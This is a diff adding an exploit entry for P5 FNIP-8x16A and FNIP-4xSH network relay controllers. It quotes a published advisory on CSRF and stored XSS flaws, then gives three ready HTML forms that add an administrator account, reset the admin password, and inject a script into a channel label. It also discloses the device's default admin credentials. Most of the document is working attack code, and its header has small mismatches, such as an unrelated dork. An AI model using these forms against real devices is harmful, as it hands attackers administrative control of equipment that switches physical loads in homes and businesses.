@@ -1,0 +1,90 @@
+# Exploit Title: P5 FNIP-8x16A FNIP-4xSH 1.0.20 - Cross-Site Request Forgery (Add Admin)
+# Google Dork:jizhicms
+# Date: 2020-04-18
+# Exploit Author: iej1ctk1g
+# Product web page: https://www.p5.hu
+# Affected version: 1.0.20, 1.0.11
+# CVE : N/A
+
+<!--
+
+
+P5 FNIP-8x16A/FNIP-4xSH CSRF Stored Cross-Site Scripting
+
+
+Vendor: P5
+Product web page: https://www.p5.hu
+Affected version: 1.0.20, 1.0.11
+
+Summary: The FNIP-8x16A is an eight channel relay module used for switching any
+type of load that doesn’t exceed the specifications. Via its built-in web site
+and TCP/IP communication, the outputs and inputs can be controlled and monitored
+from standard network capable devices such as computers, smartphones, web-tablets,
+etc. either locally or via the network. The module can be used independently or
+as part of a complex control system in residential and commercial installations.
+
+Desc: The controller suffers from CSRF and XSS vulnerabilities. The application
+allows users to perform certain actions via HTTP requests without performing any
+validity checks to verify the requests. This can be exploited to perform certain
+actions with administrative privileges if a logged-in user visits a malicious web
+site. Input passed to several GET/POST parameters is not properly sanitised before
+being returned to the user. This can be exploited to execute arbitrary HTML and
+script code in a user's browser session in context of an affected site.
+
+Tested on: Linux
+           CGI
+
+
+Vulnerabiity discovered by Gjoko 'LiquidWorm' Krstic
+                           @zeroscience
+
+
+Advisory ID: ZSL-2020-5564
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5564.php
+
+
+29.01.2020
+
+-->
+
+
+<!-- CSRF add admin user -->
+<html>
+  <body>
+    <form action="http://192.168.1.17:83/user.cgi" method="POST">
+      <input type="hidden" name="uno" value="1" />        <!-- User number (user1) -->
+      <input type="hidden" name="un" value="testingus" /> <!-- Username -->
+      <input type="hidden" name="role" value="2" />       <!-- 2: Admin, 1: Actor, 0: Observer -->
+      <input type="hidden" name="enabled" value="1" />
+      <input type="hidden" name="pw" value="123456" />
+      <input type="hidden" name="pw2" value="123456" />
+      <input type="submit" value="Zubmit" />
+    </form>
+  </body>
+</html>
+
+<!-- CSRF change admin password -->
+<html>
+  <body>
+    <form action="http://192.168.1.17:83/user.cgi" method="POST">
+      <input type="hidden" name="un" value="admin" /> <!-- Defaults: admin:futurenow -->
+      <input type="hidden" name="pw" value="123456" />
+      <input type="hidden" name="pw2" value="123456" />
+      <input type="submit" value="Zubmit" />
+    </form>
+  </body>
+</html>
+
+<!-- XSS modify labels -->
+<html>
+  <body>
+    <form action="http://192.168.1.17:83/config.html" method="POST">
+      <input type="hidden" name="lab1" value="Channel1" />
+      <input type="hidden" name="lab2" value="Channel2" />
+      <input type="hidden" name="lab3" value="Channel3" />
+      <input type="hidden" name="lab4" value='"><script>confirm(251)</script>' />
+      <input type="hidden" name="lab12" value="etc." />
+      <input type="submit" value="Zubmit" />
+    </form>
+  </body>
+</html>
